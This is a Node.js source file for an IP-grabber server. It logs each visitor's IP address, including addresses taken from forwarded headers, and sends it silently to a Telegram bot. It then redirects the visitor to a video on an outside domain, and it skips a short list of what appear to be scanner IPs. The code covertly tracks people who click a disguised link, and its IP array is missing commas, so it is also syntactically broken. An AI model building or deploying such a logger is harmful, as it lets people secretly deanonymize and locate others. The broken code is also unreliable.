require('dotenv').config();
const http = require('http');
const https = require('https');
const querystring = require('querystring');

const ignoredIps = [
    '216.144.248.29'
    '44.208.23.181'
    '3.113.26.183', // Add more IPs here as needed
];

const getClientIp = (req) => {
    const xForwardedFor = req.headers['x-forwarded-for'];
    if (xForwardedFor) {
        const ips = xForwardedFor.split(',').map(ip => ip.trim());
        const uniqueIps = [...new Set(ips)];
        for (const ip of uniqueIps) {
            if (!/^10\.|^172\.(1[6-9]|2[0-9]|3[0-1])\.|^192\.168\./.test(ip)) {
                return ip;
            }
        }
        return uniqueIps[0];
    }
    return req.socket.remoteAddress;
};

const sendToTelegram = (ip) => {
    if (ignoredIps.includes(ip)) {
        return;
    }

    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    const message = `IP: ${ip}`;

    const data = querystring.stringify({
        chat_id: chatId,
        text: message
    });

    const options = {
        hostname: 'api.telegram.org',
        path: `/bot${token}/sendMessage`,
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': data.length
        }
    };

    const req = https.request(options, (res) => {
        res.on('data', (d) => {
            process.stdout.write(d);
        });
    });

    req.on('error', (e) => {
        console.error(e);
    });

    req.write(data);
    req.end();
};

const requestListener = (req, res) => {
    const clientIp = getClientIp(req);
    sendToTelegram(clientIp);

    res.writeHead(302, { 'Location': 'https://b4sicallyf0x.com/up.mp4' });
    res.end();
};

const server = http.createServer(requestListener);
const port = 80;
server.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
